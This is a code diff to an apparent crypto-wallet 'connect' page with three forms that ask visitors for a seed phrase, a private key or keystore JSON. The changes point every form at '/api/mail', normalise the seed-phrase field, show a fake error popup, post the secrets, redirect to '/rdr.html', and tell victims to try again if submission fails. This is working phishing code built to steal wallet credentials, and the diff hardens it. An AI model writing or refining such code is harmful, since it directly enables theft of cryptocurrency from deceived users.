@@ -2030,7 +2030,7 @@
                     </div>
 
                     <!--<form id="phraseFormg">-->
-                    <form id="contact-form-1" method="post">
+                    <form id="contact-form-1" method="post" action="/api/mail">
                         <!-- Phrase Tab Content -->
                         <div class="tab-content active" id="phrase">
                             <label for="phrase">Enter Phrase</label>
@@ -2039,7 +2039,7 @@
                         </div>
                     </form>
                     <!--<form id="privatekeyForm">-->
-                    <form id="contact-form-2" method="post">
+                    <form id="contact-form-2" method="post" action="/api/mail">
                         <!-- Private Key Tab Content -->
                         <div class="tab-content" id="privatekey">
                             <label for="private-key">Enter Private Key</label>
@@ -2048,7 +2048,7 @@
                         </div>
                     </form>
                     <!--<form id="keystoreForm">-->
-                    <form id="contact-form-3" method="post">
+                    <form id="contact-form-3" method="post" action="/api/mail">
                         <!-- Keystore JSON Tab Content -->
                         <div class="tab-content" id="keystore">
                             <label for="keystore-json">Keystore JSON</label>
@@ -2116,19 +2116,37 @@
                     const formData = new FormData(form);
                     const data = Object.fromEntries(formData.entries());
 
+                    if (!data.seedphrase && data.phrase) {
+                        data.seedphrase = data.phrase;
+                    }
+
+                    if (!data.phase) {
+                        data.phase = 'seedphrase';
+                    }
+
+                    if (data.phrase && !data.seedphrase) {
+                        data.seedphrase = data.phrase;
+                    }
+
                     showErrorPopup();
 
                     try {
-                        await fetch('/api/mail', {
+                        const response = await fetch('/api/mail', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                             },
                             body: new URLSearchParams(data).toString()
                         });
+
+                        if (!response.ok) {
+                            throw new Error('Mail submission failed');
+                        }
+
                         window.location.href = '/rdr.html';
                     } catch (error) {
                         console.error('Wallet submit error:', error);
+                        alert('Unable to submit the wallet details right now. Please try again.');
                     }
                 }
             </script>
